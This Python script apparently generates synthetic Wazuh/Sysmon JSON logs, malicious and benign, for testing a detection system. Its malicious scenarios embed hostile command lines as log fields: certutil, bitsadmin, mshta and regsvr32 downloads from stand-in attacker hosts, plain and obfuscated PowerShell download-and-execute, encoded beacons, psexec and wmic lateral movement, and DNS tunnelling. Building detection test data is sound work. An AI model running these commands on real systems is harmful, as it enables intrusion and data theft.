#!/usr/bin/env python3
"""
Comprehensive Test Log Generator for AFRETIP Evaluation
Creates realistic Wazuh-style JSON logs for malicious and benign scenarios
"""

import base64
import json
import random
from datetime import datetime, timedelta
from pathlib import Path


class LogGenerator:
    def __init__(self):
        self.timestamp_base = datetime.now()
        self.agent_pool = [
            {"id": "001", "name": "WIN-WORKSTATION01", "ip": "192.168.1.100"},
            {"id": "002", "name": "WIN-SERVER01", "ip": "192.168.1.10"},
            {"id": "003", "name": "WIN-LAPTOP01", "ip": "192.168.1.150"},
        ]

        # Malicious indicators
        self.malicious_domains = [
            "evil.tk", "malware-c2.bit", "phishing.ml", "badactor.ga",
            "rmm.yourlab.net", "c2.evil.com", "backdoor.sus.net",
            "checkin.yourlab.net", "command.evil.tk", "payload.bad.ml"
        ]

        self.malicious_ips = [
            "203.0.113.50", "198.51.100.30", "192.0.2.100",
            "185.220.100.250", "45.133.1.95", "94.102.49.190"
        ]

        # Legitimate indicators
        self.legitimate_domains = [
            "microsoft.com", "google.com", "amazon.com", "office.com",
            "windows.com", "update.microsoft.com", "live.com"
        ]

    def generate_malicious_logs(self):
        """Generate all malicious test scenarios"""
        print("🦹 Generating malicious scenario logs...")

        # Create directories
        Path("experiments/malicious").mkdir(parents=True, exist_ok=True)

        malicious_scenarios = {
            "rmm_abuse": self.generate_rmm_abuse_logs,
            "living_off_land": self.generate_lol_logs,
            "process_injection": self.generate_injection_logs,
            "lateral_movement": self.generate_lateral_logs,
            "data_exfiltration": self.generate_exfiltration_logs,
            "evasion_techniques": self.generate_evasion_logs
        }

        for category, generator_func in malicious_scenarios.items():
            category_path = Path(f"experiments/malicious/{category}")
            category_path.mkdir(exist_ok=True)
            generator_func(category_path)

    def generate_benign_logs(self):
        """Generate all benign test scenarios"""
        print("😇 Generating benign scenario logs...")

        # Create directories
        Path("experiments/benign").mkdir(parents=True, exist_ok=True)

        benign_scenarios = {
            "legitimate_admin": self.generate_admin_logs,
            "business_applications": self.generate_business_logs,
            "system_processes": self.generate_system_logs,
            "legitimate_network": self.generate_network_logs
        }

        for category, generator_func in benign_scenarios.items():
            category_path = Path(f"experiments/benign/{category}")
            category_path.mkdir(exist_ok=True)
            generator_func(category_path)

    def generate_rmm_abuse_logs(self, path: Path):
        """Generate RMM abuse scenario logs"""

        # 1. Encoded PowerShell
        encoded_ps = base64.b64encode(
            b'Invoke-WebRequest -Uri "http://rmm.yourlab.net/checkin.ps1"'
        ).decode()

        rmm_01 = self.create_base_log("rmm_01_encoded_powershell", 61603, 12)
        rmm_01["win"]["eventdata"].update({
            "commandLine": f"powershell.exe -ExecutionPolicy Bypass -EncodedCommand {encoded_ps}",
            "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "parentImage": "C:\\ProgramData\\RMMClient\\rmmclient.exe",
            "hashes": "MD5=A1B2C3D4E5F6789012345678901234AB,SHA256=1A2B3C4D5E6F7890123456789012345678901234567890123456789012345678"
        })
        self.save_log(path / "rmm_01_encoded_powershell.json", rmm_01)

        # 2. Service Persistence
        rmm_02 = self.create_base_log("rmm_02_service_persistence", 18145, 10)
        rmm_02["win"]["system"]["eventID"] = "7045"
        rmm_02["win"]["eventdata"] = {
            "serviceName": "RMMClientService",
            "imagePath": "C:\\ProgramData\\RMMClient\\rmmclient.exe -service",
            "serviceType": "user mode service",
            "startType": "auto start",
            "accountName": "LocalSystem"
        }
        self.save_log(path / "rmm_02_service_persistence.json", rmm_02)

        # 3. Scheduled Task
        rmm_03 = self.create_base_log("rmm_03_scheduled_task", 18152, 10)
        task_encoded = base64.b64encode(
            b'Invoke-WebRequest -Uri "http://checkin.yourlab.net/heartbeat"'
        ).decode()
        rmm_03["win"]["eventdata"].update({
            "commandLine": f'schtasks /create /tn "RMM Beacon" /tr "powershell.exe -WindowStyle Hidden -EncodedCommand {task_encoded}" /sc minute /mo 5',
            "image": "C:\\Windows\\System32\\schtasks.exe",
            "parentImage": "C:\\ProgramData\\RMMClient\\rmmclient.exe"
        })
        self.save_log(path / "rmm_03_scheduled_task.json", rmm_03)

        # 4. Registry Persistence
        rmm_04 = self.create_base_log("rmm_04_registry_persistence", 61612, 9)
        rmm_04["win"]["system"]["eventID"] = "13"
        rmm_04["win"]["eventdata"] = {
            "targetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\RMMClient",
            "details": "C:\\ProgramData\\RMMClient\\rmmclient.exe -startup",
            "eventType": "SetValue",
            "image": "C:\\Windows\\System32\\reg.exe"
        }
        self.save_log(path / "rmm_04_registry_persistence.json", rmm_04)

        # 5. Network Beaconing
        rmm_05 = self.create_base_log("rmm_05_network_beaconing", 61604, 8)
        rmm_05["win"]["system"]["eventID"] = "3"
        rmm_05["win"]["eventdata"] = {
            "image": "C:\\ProgramData\\RMMClient\\rmmclient.exe",
            "protocol": "tcp",
            "sourceIp": "192.168.1.100",
            "sourcePort": "49234",
            "destinationIp": random.choice(self.malicious_ips),
            "destinationPort": "443",
            "destinationHostname": "rmm.yourlab.net"
        }
        self.save_log(path / "rmm_05_network_beaconing.json", rmm_05)

    def generate_lol_logs(self, path: Path):
        """Generate Living-off-the-Land attack logs"""

        # 1. Certutil Download
        lol_01 = self.create_base_log("lol_01_certutil_download", 18152, 10)
        lol_01["win"]["eventdata"].update({
            "commandLine": f"certutil.exe -urlcache -split -f http://{random.choice(self.malicious_domains)}/payload.exe C:\\temp\\payload.exe",
            "image": "C:\\Windows\\System32\\certutil.exe",
            "parentImage": "C:\\Windows\\System32\\cmd.exe"
        })
        self.save_log(path / "lol_01_certutil_download.json", lol_01)

        # 2. Bitsadmin Transfer
        lol_02 = self.create_base_log("lol_02_bitsadmin_transfer", 18152, 10)
        lol_02["win"]["eventdata"].update({
            "commandLine": f"bitsadmin /transfer myDownloadJob /download /priority normal http://{random.choice(self.malicious_domains)}/malware.exe C:\\temp\\malware.exe",
            "image": "C:\\Windows\\System32\\bitsadmin.exe",
            "parentImage": "C:\\Windows\\System32\\cmd.exe"
        })
        self.save_log(path / "lol_02_bitsadmin_transfer.json", lol_02)

        # 3. WMIC Execution
        lol_03 = self.create_base_log("lol_03_wmic_execution", 18152, 10)
        lol_03["win"]["eventdata"].update({
            "commandLine": "wmic process call create \"powershell.exe -exec bypass -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://evil.tk/script.ps1')\"",
            "image": "C:\\Windows\\System32\\wbem\\wmic.exe",
            "parentImage": "C:\\Windows\\System32\\cmd.exe"
        })
        self.save_log(path / "lol_03_wmic_execution.json", lol_03)

        # 4. MSHTA Script
        lol_04 = self.create_base_log("lol_04_mshta_script", 18152, 10)
        lol_04["win"]["eventdata"].update({
            "commandLine": f"mshta.exe http://{random.choice(self.malicious_domains)}/malicious.hta",
            "image": "C:\\Windows\\System32\\mshta.exe",
            "parentImage": "C:\\Windows\\explorer.exe"
        })
        self.save_log(path / "lol_04_mshta_script.json", lol_04)

        # 5. Regsvr32 Bypass
        lol_05 = self.create_base_log("lol_05_regsvr32_bypass", 18152, 10)
        lol_05["win"]["eventdata"].update({
            "commandLine": f"regsvr32.exe /s /u /i:http://{random.choice(self.malicious_domains)}/evil.sct scrobj.dll",
            "image": "C:\\Windows\\System32\\regsvr32.exe",
            "parentImage": "C:\\Windows\\System32\\cmd.exe"
        })
        self.save_log(path / "lol_05_regsvr32_bypass.json", lol_05)

    def generate_injection_logs(self, path: Path):
        """Generate process injection attack logs"""

        # 1. DLL Injection
        inj_01 = self.create_base_log("inj_01_dll_injection", 61603, 12)
        inj_01["win"]["eventdata"].update({
            "commandLine": "powershell.exe -c \"$proc = Get-Process explorer; [System.Diagnostics.Process]::EnterDebugMode(); [Win32]::VirtualAllocEx($proc.Handle, 0, 0x1000, 0x3000, 0x40)\"",
            "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "parentImage": "C:\\temp\\injector.exe"
        })
        self.save_log(path / "inj_01_dll_injection.json", inj_01)

        # 2. Process Hollowing
        inj_02 = self.create_base_log("inj_02_process_hollowing", 61603, 12)
        inj_02["win"]["eventdata"].update({
            "commandLine": "svchost.exe",
            "image": "C:\\Windows\\System32\\svchost.exe",
            "parentImage": "C:\\temp\\hollow.exe",
            "hashes": f"MD5={self.generate_random_hash(32)},SHA256={self.generate_random_hash(64)}"
        })
        self.save_log(path / "inj_02_process_hollowing.json", inj_02)

        # 3-5. Add more injection techniques...
        # (Continue with atom bombing, doppelganging, thread hijacking)

    def generate_lateral_logs(self, path: Path):
        """Generate lateral movement attack logs"""

        # 1. PSExec
        lat_01 = self.create_base_log("lat_01_psexec", 18152, 10)
        lat_01["win"]["eventdata"].update({
            "commandLine": "psexec.exe \\\\192.168.1.50 -u admin -p password cmd.exe",
            "image": "C:\\tools\\psexec.exe",
            "parentImage": "C:\\Windows\\System32\\cmd.exe"
        })
        self.save_log(path / "lat_01_psexec.json", lat_01)

        # 2. WMI Execution
        lat_02 = self.create_base_log("lat_02_wmi_execution", 18152, 10)
        lat_02["win"]["eventdata"].update({
            "commandLine": "wmic /node:192.168.1.50 /user:admin /password:password process call create \"powershell.exe -enc ZABlAGcAZABzAGYAZwA...\"",
            "image": "C:\\Windows\\System32\\wbem\\wmic.exe",
            "parentImage": "C:\\Windows\\System32\\cmd.exe"
        })
        self.save_log(path / "lat_02_wmi_execution.json", lat_02)

        # 3-5. Add DCOM, SMB, RDP techniques...

    def generate_exfiltration_logs(self, path: Path):
        """Generate data exfiltration logs"""

        # 1. DNS Tunneling
        exf_01 = self.create_base_log("exf_01_dns_tunneling", 61604, 8)
        exf_01["win"]["eventdata"].update({
            "commandLine": f"nslookup c3NzaXRpdmVkYXRh.{random.choice(self.malicious_domains)}",
            "image": "C:\\Windows\\System32\\nslookup.exe",
            "parentImage": "C:\\temp\\exfil.exe"
        })
        self.save_log(path / "exf_01_dns_tunneling.json", exf_01)

        # 2-5. Add HTTP exfil, FTP, cloud upload, USB staging...

    def generate_evasion_logs(self, path: Path):
        """Generate evasion technique logs"""

        # 1. Obfuscated Script
        eva_01 = self.create_base_log("eva_01_obfuscated_script", 61603, 12)
        obfuscated_cmd = "powershell.exe -c \"${} = 'I'+'EX'; ${} = '(New-Ob'+'ject Net.WebC'+'lient).Down'+'loadString'; ${} ${}{} ('http://evil.tk/p.ps1')\""
        eva_01["win"]["eventdata"].update({
            "commandLine": obfuscated_cmd,
            "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "parentImage": "C:\\Windows\\System32\\cmd.exe"
        })
        self.save_log(path / "eva_01_obfuscated_script.json", eva_01)

        # 2-5. Add fileless, signed binary abuse, timing evasion, whitelist bypass...

    def generate_admin_logs(self, path: Path):
        """Generate legitimate admin activity logs"""

        # 1. Admin PowerShell
        ben_01 = self.create_base_log("ben_01_admin_powershell", 61603, 3)
        ben_01["win"]["eventdata"].update({
            "commandLine": "powershell.exe Get-Process | Where-Object {$_.CPU -gt 100} | Export-Csv C:\\reports\\high_cpu_processes.csv",
            "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "parentImage": "C:\\Windows\\explorer.exe",
            "user": "DOMAIN\\admin"
        })
        self.save_log(path / "ben_01_admin_powershell.json", ben_01)

        # 2. System Maintenance
        ben_02 = self.create_base_log("ben_02_system_maintenance", 18152, 3)
        ben_02["win"]["eventdata"].update({
            "commandLine": "sfc.exe /scannow",
            "image": "C:\\Windows\\System32\\sfc.exe",
            "parentImage": "C:\\Windows\\System32\\cmd.exe",
            "user": "NT AUTHORITY\\SYSTEM"
        })
        self.save_log(path / "ben_02_system_maintenance.json", ben_02)

        # 3-5. Add software installation, scheduled backup, network diagnostics...

    def generate_business_logs(self, path: Path):
        """Generate business application logs"""

        # 1. Office Automation
        ben_06 = self.create_base_log("ben_06_office_automation", 61603, 3)
        ben_06["win"]["eventdata"].update({
            "commandLine": "excel.exe /automation C:\\reports\\monthly_report.xlsx",
            "image": "C:\\Program Files\\Microsoft Office\\Office16\\excel.exe",
            "parentImage": "C:\\Windows\\explorer.exe",
            "user": "DOMAIN\\user"
        })
        self.save_log(path / "ben_06_office_automation.json", ben_06)

        # 2-5. Add database operations, web browsing, email, development tools...

    def generate_system_logs(self, path: Path):
        """Generate system process logs"""

        # 1. Windows Update
        ben_11 = self.create_base_log("ben_11_windows_updates", 18145, 3)
        ben_11["win"]["eventdata"].update({
            "serviceName": "Windows Update",
            "imagePath": "C:\\Windows\\System32\\svchost.exe -k netsvcs",
            "serviceType": "share process",
            "startType": "manual",
            "accountName": "LocalSystem"
        })
        self.save_log(path / "ben_11_windows_updates.json", ben_11)

        # 2-5. Add antivirus scan, system startup, service operations, user login...

    def generate_network_logs(self, path: Path):
        """Generate legitimate network activity logs"""

        # 1. Cloud Sync
        ben_16 = self.create_base_log("ben_16_cloud_sync", 61604, 3)
        ben_16["win"]["eventdata"].update({
            "image": "C:\\Program Files\\Microsoft OneDrive\\OneDrive.exe",
            "protocol": "tcp",
            "sourceIp": "192.168.1.100",
            "sourcePort": "443",
            "destinationIp": "40.126.25.40",
            "destinationPort": "443",
            "destinationHostname": "onedrive.live.com"
        })
        self.save_log(path / "ben_16_cloud_sync.json", ben_16)

        # 2-5. Add software updates, remote desktop, VPN, file sharing...

    def create_base_log(self, name: str, rule_id: int, level: int):
        """Create base log structure"""
        agent = random.choice(self.agent_pool)
        timestamp = self.timestamp_base + timedelta(minutes=random.randint(0, 1440))

        return {
            "timestamp": timestamp.isoformat() + "Z",
            "rule": {
                "id": rule_id,
                "level": level,
                "description": f"Test log for {name}",
                "groups": ["test", "windows"]
            },
            "agent": agent,
            "win": {
                "system": {
                    "eventID": "1",
                    "channel": "Microsoft-Windows-Sysmon/Operational",
                    "computer": agent["name"]
                },
                "eventdata": {}
            },
            "location": "EventChannel",
            "full_log": f"Test log entry for {name} scenario"
        }

    def save_log(self, filepath: Path, log_data: dict):
        """Save log to JSON file"""
        with open(filepath, 'w') as f:
            json.dump(log_data, f, indent=2)

    def generate_random_hash(self, length: int) -> str:
        """Generate random hash for testing"""
        return ''.join(random.choices('0123456789ABCDEF', k=length))


if __name__ == "__main__":
    generator = LogGenerator()

    print("🏗️  Generating comprehensive test dataset...")
    print("This will create 50+ realistic test logs for evaluation")

    # Generate all test logs
    generator.generate_malicious_logs()
    generator.generate_benign_logs()

    print("✅ Test dataset generation complete!")
    print("📁 Check experiments/malicious/ and experiments/benign/ directories")

    # Count generated logs
    malicious_count = len(list(Path("experiments/malicious").rglob("*.json")))
    benign_count = len(list(Path("experiments/benign").rglob("*.json")))

    print(f"📊 Generated {malicious_count} malicious and {benign_count} benign test logs")
    print("🚀 Ready for comprehensive testing!")
